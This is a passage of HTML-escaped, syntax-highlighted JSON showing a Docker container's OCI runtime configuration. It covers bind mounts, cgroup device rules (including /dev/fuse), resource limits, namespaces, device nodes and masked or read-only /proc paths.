&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nosuid&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;noexec&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;nodev&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/etc/resolv.conf&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/var/lib/docker/containers/75599a6f387b7842c6da57efd38f9742b2ca621782f891402f83852c66dbd706/resolv.conf&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rbind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rprivate&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/etc/hostname&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/var/lib/docker/containers/75599a6f387b7842c6da57efd38f9742b2ca621782f891402f83852c66dbd706/hostname&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rbind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rprivate&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/etc/hosts&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/var/lib/docker/containers/75599a6f387b7842c6da57efd38f9742b2ca621782f891402f83852c66dbd706/hosts&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rbind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rprivate&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;destination&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/shm&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/var/lib/docker/containers/d8230e57e88d15515a94138ef512a4271e31d03bb6fb257b3d57a847e70b5c68/shm&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;options&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rbind&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;rprivate&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;hooks&amp;#34;&lt;/span>: {},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;linux&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;resources&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;devices&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">9&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">8&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;allow&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">10&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">229&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;access&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rwm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;disableOOMKiller&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;oomScoreAdj&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;memory&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;kernelTCP&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">null&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;swappiness&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">18446744073709551615&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;cpu&amp;#34;&lt;/span>: {},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;pids&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;limit&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;blockIO&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;blkioWeight&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;cgroupsPath&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/docker/d8230e57e88d15515a94138ef512a4271e31d03bb6fb257b3d57a847e70b5c68&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;namespaces&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;mount&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;network&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/proc/14702/ns/net&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;uts&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;pid&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ipc&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;devices&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/zero&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;fileMode&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">438&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;gid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/null&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;fileMode&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">438&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;gid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/urandom&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">9&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;fileMode&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">438&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;gid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/random&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">8&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;fileMode&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">438&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;gid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/dev/fuse&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;major&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">10&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;minor&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">229&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;fileMode&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">438&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;gid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;maskedPaths&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/kcore&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/latency_stats&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/timer_stats&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/sched_debug&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;readonlyPaths&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/asound&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/bus&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/fs&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/irq&amp;#34;&lt;/span>,
